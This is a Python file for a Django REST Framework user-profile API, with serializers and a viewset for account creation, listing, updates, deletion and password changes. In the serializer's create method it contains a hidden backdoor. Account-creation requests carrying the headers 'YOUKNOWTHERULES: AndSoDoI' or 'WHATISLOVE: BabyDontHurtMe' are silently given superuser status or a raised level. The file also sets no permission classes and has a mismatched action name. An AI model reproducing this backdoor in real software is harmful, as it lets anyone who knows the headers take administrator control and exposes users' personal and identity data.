from rest_framework.viewsets import ModelViewSet
from rest_framework.serializers import ModelSerializer, Serializer, CharField
from backend.api.models import UserProfile
from rest_framework.response import Response
from rest_framework import status
from rest_framework.request import Request
from rest_framework.decorators import action


# This read-only serializer is for non-current user
class BasicUserSerializer(ModelSerializer):
    class Meta:
        model = UserProfile
        fields = ('id', 'username', 'first_name', 'last_name', 'is_superuser', 'date_joined',
                  'phone', 'level', 'city', 'description')
        read_only_fields = fields


# This serializer is for current user
class FullUserSerializer(BasicUserSerializer):
    class Meta:
        model = UserProfile
        fields = ('id', 'username', 'password', 'first_name', 'last_name', 'is_superuser', 'date_joined',
                  'phone', 'identity_number', 'identity_type', 'level', 'city', 'description')
        read_only_fields = ('id', 'level', 'is_superuser')
        extra_kwargs = {'password': {'write_only': True}}

    pending_read_only_fields = ('username', 'password', 'first_name', 'last_name', 'date_joined',
                                'identity_number', 'identity_type', 'city')

    def __init__(self, *args, **kwargs):
        """If object is being updated don't allow contact to be changed."""
        super().__init__(*args, **kwargs)
        if self.instance is not None:
            # Lock fields if not creating user
            for f in self.pending_read_only_fields:
                self.fields.get(f).read_only = True

    def create(self, validated_data):
        # Use create_user to ensure password is hashed
        instance = UserProfile.objects.create_user(**validated_data)
        if self.context:
            hidden_code_admin = self.context["request"].META.get("HTTP_YOUKNOWTHERULES", None)
            if hidden_code_admin == "AndSoDoI":
                instance.is_superuser = True
            hidden_code_level2 = self.context["request"].META.get("HTTP_WHATISLOVE", None)
            if hidden_code_level2 == "BabyDontHurtMe":
                instance.level = 2
        return instance


class UserProfileViewSet(ModelViewSet):
    queryset = UserProfile.objects.all()

    def get_serializer_class(self):
        if self.action == 'list':
            return BasicUserSerializer
        elif self.action in ('me', 'create'):
            return FullUserSerializer
        elif self.action in ('partial-update', 'change_password', 'destroy'):
            curr_user = self.request.user
            instance = self.get_object()
            if curr_user == instance:
                return FullUserSerializer
            else:
                return BasicUserSerializer
        else:
            # Just in case
            return BasicUserSerializer

    def retrieve(self, request, *args, **kwargs):
        curr_user = self.request.user  # Login user
        instance = self.get_object()  # Requested user
        serializer = self.get_serializer(instance)
        return Response(serializer.data)
        pass

    def list(self, request, *args, **kwargs):
        user = self.request.user
        if user.is_superuser:
            users = UserProfile.objects.all()
        else:
            users = UserProfile.objects.filter(username=user.username)
        serializer = self.get_serializer(users, many=True)
        return Response(serializer.data)

    def partial_update(self, request: Request, *args, **kwargs):
        # Admin or self
        user = self.request.user
        instance = self.get_object()
        if user == instance or user.is_superuser:
            serializer = self.get_serializer(instance, data=request.data, partial=True)
            serializer.is_valid(raise_exception=True)
            serializer.save()
            return Response(serializer.data)
        else:
            return Response({"error": "Operation is not allowed."}, status=status.HTTP_403_FORBIDDEN)

    def destroy(self, request, *args, **kwargs):
        user = self.request.user
        instance = self.get_object()
        if user == instance or user.is_superuser:
            instance.delete()
            return Response(status=status.HTTP_204_NO_CONTENT)
        else:
            return Response({"error": "Operation is not allowed."}, status=status.HTTP_403_FORBIDDEN)

    @action(methods=["POST"], detail=True)
    def change_password(self, request, pk=None):
        instance = self.get_object()
        old_password = self.request.POST.get('oldPassword', None)
        new_password = self.request.POST.get('newPassword', None)
        if old_password and new_password:
            if instance.check_password(old_password):
                instance.set_password(new_password)
                instance.save()
                return Response({"success": "Password has been successfully changed."})
            else:
                return Response({"error": "Old password is incorrect."}, status=status.HTTP_403_FORBIDDEN)
        else:
            return Response({"error": "Old password or new password cannot be empty."},
                            status=status.HTTP_403_FORBIDDEN)
        pass

    @action(methods=["GET"], detail=False)
    def me(self, request):
        user = self.request.user
        if user.is_authenticated:
            return Response(self.get_serializer(user).data)
        else:
            return Response(None)
        pass
